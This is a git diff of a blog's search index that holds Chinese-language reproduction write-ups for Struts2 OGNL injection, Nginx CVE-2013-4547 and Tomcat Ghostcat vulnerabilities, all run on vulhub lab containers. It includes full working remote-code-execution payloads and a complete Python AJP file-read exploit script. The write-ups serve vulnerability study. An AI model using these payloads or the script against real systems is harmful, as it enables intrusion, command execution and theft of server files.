@@ -1,30 +1,31 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Struts2 远程命令执行漏洞 CVE-2016-3081</title>
-    <url>/2026/02/03/CVE-2016-3081/</url>
+    <title>CVE-2013-2251 Apache Struts 2 远程代码执行漏洞</title>
+    <url>/2026/02/03/CVE-2013-2251/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.3.18 - 2.3.28（不包括 2.3.20.2 和 2.3.24.2）</li>
+<li>Struts 2.0.0 - 2.3.15</li>
 </ul>
 <h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
 <h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
 <h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在配置文件 struts.xml 开启了 devMode（开发者模式），其中允许通过 method 前缀来动态执行 Action 方法。Struts2 内部存在一个安全沙盒，默认禁止执行危险的 Java 方法，为允许调用执行系统命令所需 Java 类，将上下文访问权限重置为默认，payload 片段为 #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS。权限限制接触后，攻击者通过调用 Java 环境的 Runtime 环境执行系统级别的命令，payload 片段为 @java.lang.Runtime@getRuntime ().exec(‘id’)，其中 id 可替换成其他敏感命令  </p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 Struts2 中，DefaultActionMapper 类支持以” action:”、” redirect:”、” redirectAction” 作为导航或重定向过滤，在这些前缀后面可以加入 OGNL 表达式，Struts2 没有对这些前缀做过滤，可以利用 OGNL 表达式调用 Java 静态方法执行任意系统命令</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-032</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-016</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="1773316738135.png" alt="1773316738135"></p>
-<p>用 burpsuite 抓取 http://公网: 8080/index.action 流量包</p>
-<p><img src="1773316931101.png" alt="1773316931101"></p>
+<p><img src="1773316394891.png" alt="1773316394891"></p>
+<p>访问 http://公网: 8080，出现 Hello world 即搭建成功</p>
+<p><img src="1773316436796.png" alt="1773316436796"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/index.action 数据包</p>
+<p><img src="1773316494758.png" alt="1773316494758"></p>
 <p>发送到 Repeater 模块</p>
-<p><img src="1773316855000.png" alt="1773316855000"></p>
-<p>加上参数 payload</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="1773316540251.png" alt="1773316540251"><br>在 action 后添加 payload，括号已经经过 url 编码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?redirect:%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'id'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3D(new%20java.io.InputStreamReader(%23b))%2C%23d%3D(new%20java.io.BufferedReader(%23c))%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="1773316979886.png" alt="1773316979886"></p>
-<p>成功执行命令 id</p>
-<p><img src="1773317026124.png" alt="1773317026124"></p>
+<p><img src="1773316578390.png" alt="1773316578390"></p>
+<p>发送后页面出现 id 结果</p>
+<p><img src="1773316617088.png" alt="1773316617088"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
@@ -32,6 +33,55 @@
       <tags>
         <tag>CVE</tag>
         <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx 文件名逻辑漏洞 CVE-2013-4547</title>
+    <url>/2026/02/12/CVE-2013-4547/</url>
+    <content><![CDATA[<h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><ul>
+<li>Nginx 0.8.41 - 1.4.3</li>
+<li>Nginx 1.5.0 - 1.5.7</li>
+</ul>
+<h2 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h2><p>任意文件解析</p>
+<h2 id="操作系统限制："><a href="#操作系统限制：" class="headerlink" title="操作系统限制："></a>操作系统限制：</h2><p>无</p>
+<h2 id="配置要求："><a href="#配置要求：" class="headerlink" title="配置要求："></a>配置要求：</h2><p>默认配置</p>
+<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>远程命令执行</p>
+<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>在受影响的版本中，Nginx 读取路径中的字符时候，遇到空格会认为路径部分结束，接下来是 HTTP 协议版本，如果在空格后面接着一个空字节（0x00），Nginx 错误地跳过正常终止逻辑，允许非法字符序列进入后续路径处理。攻击者修改文件后缀，末尾有一个空格，Nginx 接收到请求后在磁盘找到相应文件后认为请求合法，但完整路径是/uploadfiles/文件名.gif[0x20] [0x00].php，配置文件 conf 正则匹配到.php，就会交给后端 FastCGI 处理，由于 FastCGI 协议和 PHP 解析器是基于 C 语言字符串处理，C 语言中的 0x00 代表字符串结束，PHP 实际处理的文件则是/uploadfiles/文件名.gif，因为该文件已经被 Nginx 指定文件后缀，PHP 会忽略其 gif 后缀，直接解析其中的 PHP 代码，导致远程代码执行</p>
+<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/nginx/CVE-2013-4547</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773154432311.png" alt="1773154432311"></p>
+<p>写一个 phpinfo，保存为 php 文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773154466853.png" alt="1773154466853"></p>
+<p>访问 http://靶机 ip:8080，将刚刚写的的 php 木马上传</p>
+<p><img src="1773154489302.png" alt="1773154489302"></p>
+<p>上传失败</p>
+<p><img src="1773154498191.png" alt="1773154498191"></p>
+<p>选择木马 php 文件，用 burpsuite 抓取数据包</p>
+<p><img src="1773154569504.png" alt="1773154569504"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="1773154729254.png" alt="1773154729254"></p>
+<p>修改文件后缀为.gif ，gif 后面有一个空格</p>
+<p><img src="1773154881633.png" alt="1773154881633"></p>
+<p>发送后返回 200</p>
+<p><img src="1773155039760.png" alt="1773155039760"></p>
+<p>用 burpsuite 抓取 http://公网 ip:8080/uploadfiles/payload.gif.php 的数据包</p>
+<p><img src="1773155089351.png" alt="1773155089351"></p>
+<p>发送到 Repeater 模块，并修改访问路径，在 gif 后面加两个空格</p>
+<p><img src="1773155128963.png" alt="1773155128963"></p>
+<p>到 Hex 将后一个 20（空格）改为 00，后发送返回 200</p>
+<p><img src="1773155196297.png" alt="1773155196297"></p>
+<p>查看页面，可以看到执行了 phpinfo ()，可以上传一句话木马，但是该信道是发一次数据包执行一次命令，并不是连续且实时通信的信道</p>
+<p><img src="1773155242548.png" alt="1773155242548"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Nginx</tag>
       </tags>
   </entry>
   <entry>
@@ -95,69 +145,42 @@
       </tags>
   </entry>
   <entry>
-    <title>Struts2 远程代码执行漏洞 CVE-2017-5638</title>
-    <url>/2026/02/04/CVE-2017-5638/</url>
+    <title>Struts2 远程代码执行漏洞 CVE-2018-11776</title>
+    <url>/2026/02/04/CVE-2018-11776/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.3.5 – 2.3.31</li>
-<li>Struts 2.5 – 2.5.10</li>
+<li>Struts 2.3 – 2.3.34  </li>
+<li>Struts 2.5 – 2.5.16</li>
 </ul>
 <h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
 <h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>漏洞产生主要原因是 Struts2 有一个复杂功能，给错误信息赋动态变量，构造的 payload 通过错误信息进入到动态变量，后续通过动态变量抛出报错信息同时执行敏感命令。Struts2 默认使用 Jakarta 库来解析上传文件，通过构造异常的 Content-Type，Jakarta 解析器无法识别并抛出该字符串错误，Struts2 将错误转化为可读错误提示，findText () 函数解析时候，错误信息内有 %(# 符号，识别为需要计算的表达式，OGNL 引擎解析并执行括号里面的 Java 代码，即敏感命令</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-045</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p>可以通过 docker ps 查看镜像</p>
-<p><img src="1773317613909.png" alt="1773317613909"></p>
-<p>用 burpsuite 抓取 http://公网: 8080 流量包</p>
-<p><img src="1773317657503.png" alt="1773317657503"></p>
-<p>使用 Repeater 模块</p>
-<p><img src="1773317777800.png" alt="1773317777800"></p>
-<p>随便添加参数</p>
-<p><img src="1773317706752.png" alt="1773317706752"></p>
-<p>修改 Content-Type 内容，换成下面的恶意 payload，并删掉加入的参数</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%{(#nick='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmds={'id'}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773317824744.png" alt="1773317824744"></p>
-<p>发送后，响应码为 200，且执行了命令 id</p>
-<p><img src="1773317875838.png" alt="1773317875838"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2013-2251 Apache Struts 2 远程代码执行漏洞</title>
-    <url>/2026/02/03/CVE-2013-2251/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.0.0 - 2.3.15</li>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>alwaysSelectFullNamespace 设置为 true</li>
+<li>package 标签未定义 namespace 或使用了通配符</li>
 </ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 Struts2 中，DefaultActionMapper 类支持以” action:”、” redirect:”、” redirectAction” 作为导航或重定向过滤，在这些前缀后面可以加入 OGNL 表达式，Struts2 没有对这些前缀做过滤，可以利用 OGNL 表达式调用 Java 静态方法执行任意系统命令</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Struts2 将 URL 路径中的 namespace 当作 OGNL 表达式，在重定向跳转时对其进行二次解析，执行敏感命令。Struts2 中的 URL 结构通常为 http://域名/命名空间/Action 名.action，如果攻击者访问不存在的命名空间，且配置了 alwaysSelectFullNamespace = true，那么会将攻击者注入的 payload 提取出来，将动态变量赋值为攻击 payload，OGNL 引擎解析命名空间时候执行了恶意 payload</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-016</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-057</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="1773316394891.png" alt="1773316394891"></p>
-<p>访问 http://公网: 8080，出现 Hello world 即搭建成功</p>
-<p><img src="1773316436796.png" alt="1773316436796"></p>
-<p>用 burpsuite 抓取 http://公网: 8080/index.action 数据包</p>
-<p><img src="1773316494758.png" alt="1773316494758"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="1773316540251.png" alt="1773316540251"><br>在 action 后添加 payload，括号已经经过 url 编码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?redirect:%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'id'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3D(new%20java.io.InputStreamReader(%23b))%2C%23d%3D(new%20java.io.BufferedReader(%23c))%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="1773323657480.png" alt="1773323657480"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/struts2-showcase 数据包</p>
+<p><img src="1773323699382.png" alt="1773323699382">发送到 Repeater 模块<br><img src="1773323750416.png" alt="1773323750416"></p>
+<p>将 URL 访问改成下面 payload，即在原本基础上添加即可，这里用 ${(777 * 777)} 是为了验证漏洞，下面对 payload 的特殊符号已经进行 url 编码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/struts2-showcase/%24%7B%28777%2A777%29%7D/actionChain1.action</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="1773316578390.png" alt="1773316578390"></p>
-<p>发送后页面出现 id 结果</p>
-<p><img src="1773316617088.png" alt="1773316617088"></p>
+<p><img src="1773323786334.png" alt="1773323786334"></p>
+<p>响应码为 302，点击跟随重定向</p>
+<p><img src="1773323830540.png" alt="1773323830540"></p>
+<p>原链接出现了计算结果，执行了 OGNL 表达式，说明存在注入点</p>
+<p><img src="1773323872780.png" alt="1773323872780"></p>
+<p>下面执行更加敏感的命令，替换掉上面 ${(777 * 777)} 的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773323920618.png" alt="1773323920618"></p>
+<p>响应码 302，进行重定向</p>
+<p><img src="1773323963853.png" alt="1773323963853"></p>
+<p>出现敏感命令执行的结果</p>
+<p><img src="1773324000078.png" alt="1773324000078"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
@@ -197,93 +220,6 @@
       <tags>
         <tag>CVE</tag>
         <tag>Nginx</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nginx 文件名逻辑漏洞 CVE-2013-4547</title>
-    <url>/2026/02/12/CVE-2013-4547/</url>
-    <content><![CDATA[<h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><ul>
-<li>Nginx 0.8.41 - 1.4.3</li>
-<li>Nginx 1.5.0 - 1.5.7</li>
-</ul>
-<h2 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h2><p>任意文件解析</p>
-<h2 id="操作系统限制："><a href="#操作系统限制：" class="headerlink" title="操作系统限制："></a>操作系统限制：</h2><p>无</p>
-<h2 id="配置要求："><a href="#配置要求：" class="headerlink" title="配置要求："></a>配置要求：</h2><p>默认配置</p>
-<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>远程命令执行</p>
-<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>在受影响的版本中，Nginx 读取路径中的字符时候，遇到空格会认为路径部分结束，接下来是 HTTP 协议版本，如果在空格后面接着一个空字节（0x00），Nginx 错误地跳过正常终止逻辑，允许非法字符序列进入后续路径处理。攻击者修改文件后缀，末尾有一个空格，Nginx 接收到请求后在磁盘找到相应文件后认为请求合法，但完整路径是/uploadfiles/文件名.gif[0x20] [0x00].php，配置文件 conf 正则匹配到.php，就会交给后端 FastCGI 处理，由于 FastCGI 协议和 PHP 解析器是基于 C 语言字符串处理，C 语言中的 0x00 代表字符串结束，PHP 实际处理的文件则是/uploadfiles/文件名.gif，因为该文件已经被 Nginx 指定文件后缀，PHP 会忽略其 gif 后缀，直接解析其中的 PHP 代码，导致远程代码执行</p>
-<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/nginx/CVE-2013-4547</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773154432311.png" alt="1773154432311"></p>
-<p>写一个 phpinfo，保存为 php 文件</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773154466853.png" alt="1773154466853"></p>
-<p>访问 http://靶机 ip:8080，将刚刚写的的 php 木马上传</p>
-<p><img src="1773154489302.png" alt="1773154489302"></p>
-<p>上传失败</p>
-<p><img src="1773154498191.png" alt="1773154498191"></p>
-<p>选择木马 php 文件，用 burpsuite 抓取数据包</p>
-<p><img src="1773154569504.png" alt="1773154569504"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="1773154729254.png" alt="1773154729254"></p>
-<p>修改文件后缀为.gif ，gif 后面有一个空格</p>
-<p><img src="1773154881633.png" alt="1773154881633"></p>
-<p>发送后返回 200</p>
-<p><img src="1773155039760.png" alt="1773155039760"></p>
-<p>用 burpsuite 抓取 http://公网 ip:8080/uploadfiles/payload.gif.php 的数据包</p>
-<p><img src="1773155089351.png" alt="1773155089351"></p>
-<p>发送到 Repeater 模块，并修改访问路径，在 gif 后面加两个空格</p>
-<p><img src="1773155128963.png" alt="1773155128963"></p>
-<p>到 Hex 将后一个 20（空格）改为 00，后发送返回 200</p>
-<p><img src="1773155196297.png" alt="1773155196297"></p>
-<p>查看页面，可以看到执行了 phpinfo ()，可以上传一句话木马，但是该信道是发一次数据包执行一次命令，并不是连续且实时通信的信道</p>
-<p><img src="1773155242548.png" alt="1773155242548"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Nginx</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tomcat 文件包含漏洞 CVE-2020-1938</title>
-    <url>/2026/02/12/CVE-2020-1938/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Apache Tomcat 6.x (全版本受影响)</li>
-<li>Apache Tomcat 7.0.0 - 7.0.99</li>
-<li>Apache Tomcat 8.5.0 - 8.5.50</li>
-<li>Apache Tomcat 9.0.0.M1 - 9.0.30</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>二进制解析漏洞</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>8009 端口打开</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
-<li>任意文件读取，例如读取 WEB - INF / web.xml 文件，只能读取使用 AJP 目录下的文件</li>
-<li>文件包含，RCE 远程代码执行，可以是反弹 shell</li>
-</ul>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p> AJP 协议默认监听端口通常缺乏认证，利用协议缺陷，伪造 javax.servlet.include 属性</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#拉取镜像</span><br><span class="line">docker run -d -p 8082:8080 -p 8009:8009 --name ghostcat-vulhub vulhub/tomcat:9.0.30</span><br></pre></td></tr></tbody></table></figure>
-
-<p>使用云服务器：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入攻击脚本</span><br><span class="line">cat &lt;&lt; 'EOF' &gt; ghostcat.py</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None: return struct.pack('&gt;H', 0xffff)</span><br><span class="line">    b = s.encode('utf-8')</span><br><span class="line">    return struct.pack('&gt;H', len(b)) + b + b'\x00'</span><br><span class="line"></span><br><span class="line">def exploit(target_host, target_port, file_path):</span><br><span class="line">    # AJP13 Forward Request Header</span><br><span class="line">    # 0x02 = Forward Request, 0x02 = GET Method</span><br><span class="line">    data = b'\x02\x02' </span><br><span class="line">    data += pack_string("HTTP/1.1")</span><br><span class="line">    data += pack_string("/index.jsp")</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += pack_string(None)</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += struct.pack('&gt;H', 80)</span><br><span class="line">    data += b'\x00' # is_ssl: false</span><br><span class="line">    data += struct.pack('&gt;H', 0) # num_headers: 0</span><br><span class="line"></span><br><span class="line">    # 注入核心：Ghostcat 必备的三个属性</span><br><span class="line">    attrs = [</span><br><span class="line">        ("javax.servlet.include.request_uri", "/"),</span><br><span class="line">        ("javax.servlet.include.path_info", file_path),</span><br><span class="line">        ("javax.servlet.include.servlet_path", "/")</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for name, value in attrs:</span><br><span class="line">        data += b'\x0a' # SC_A_REQ_ATTRIBUTE</span><br><span class="line">        data += pack_string(name)</span><br><span class="line">        data += pack_string(value)</span><br><span class="line">    </span><br><span class="line">    data += b'\xff' # terminator</span><br><span class="line"></span><br><span class="line">    # 封装 AJP 头部</span><br><span class="line">    header = b'\x12\x34'</span><br><span class="line">    msg_len = struct.pack('&gt;H', len(data))</span><br><span class="line">    packet = header + msg_len + data</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(5)</span><br><span class="line">        s.connect((target_host, target_port))</span><br><span class="line">        s.sendall(packet)</span><br><span class="line">        </span><br><span class="line">        print(f"[*] Attacking {target_host}:{target_port} -&gt; {file_path}")</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            res = s.recv(8192)</span><br><span class="line">            if not res: break</span><br><span class="line">            # 过滤掉 AJP 协议的二进制头，直接输出内容</span><br><span class="line">            print(res.decode('utf-8', errors='ignore'))</span><br><span class="line">        s.close()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f"[!] Error: {e}")</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    import sys</span><br><span class="line">    host = sys.argv[1] if len(sys.argv) &gt; 1 else '127.0.0.1'</span><br><span class="line">    path = sys.argv[2] if len(sys.argv) &gt; 2 else '/WEB-INF/web.xml'</span><br><span class="line">    exploit(host, 8009, path)</span><br><span class="line">EOF</span><br><span class="line">#运行脚本获取xml文件</span><br><span class="line">python3 ghostcat.py 公网 /WEB-INF/web.xml</span><br></pre></td></tr></tbody></table></figure>
-
-<p>成功复现读取/WEB - INF/web.xml 文件</p>
-<p><img src="1773154158887.png" alt="1773154158887"></p>
-<p>后续进行文件包含，因为靶场环境是纯净的 tomcat，实际环境需要寻找上传点上传木马文件，这里直接写入到靶场中</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入敏感文件</span><br><span class="line">docker exec ghostcat-vulhub bash -c 'echo "&lt;% out.println(\"SUCCESS_RCE\"); %&gt;" &gt; /usr/local/tomcat/webapps/ROOT/proof.txt'</span><br><span class="line">#文件包含，并不是简单的txt，里面含有java代码，将静态文本强制解析为Java代码</span><br><span class="line">python3 ghostcat.py 公网 /proof.txt</span><br></pre></td></tr></tbody></table></figure>
-
-<p>出现 SUCCESS_RCE 表明成功实现文件包含，执行了代码</p>
-<p><img src="1773154229210.png" alt="1773154229210"></p>
-]]></content>
-      <categories>
